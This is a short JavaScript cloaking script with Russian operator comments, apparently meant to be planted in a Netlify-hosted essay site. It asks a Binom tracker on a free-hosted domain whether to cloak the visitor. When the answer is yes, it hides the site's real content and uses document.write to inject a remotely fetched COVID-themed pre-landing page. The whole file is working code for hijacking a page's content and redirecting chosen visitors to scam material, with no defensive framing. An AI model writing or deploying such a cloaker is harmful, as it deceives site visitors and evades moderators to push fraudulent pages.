var binomCampaingKey = 'qg15f8wf5z6hjqlp36rd'; /*Netlify _Essay, id:371. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
var landingUrl = 'https://endemic-tours.000webhostapp.com/landing/covid_2/'; /*Адрес преленда, который необходимо подгрузить*/

var landing = landingUrl;
/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/

var url = 'https://endemic-tours.000webhostapp.com/binom/?bckey='+binomCampaingKey;
var xhr = new XMLHttpRequest();
var cloakResult = 'no';

xhr.open('GET', url, false);
xhr.send();

if (xhr.status == 200) {
  cloakResult = xhr.responseText;
} 

if(cloakResult=="yes"){
var xhrLand = new XMLHttpRequest();
var landingCode = '';

xhrLand.open('GET', landing, false);
xhrLand.send();

if (xhrLand.status == 200) {
  landingCode = xhrLand.responseText;
}

document.write("<style>#swrap{display:none;}</style>")

document.write(landingCode);

}
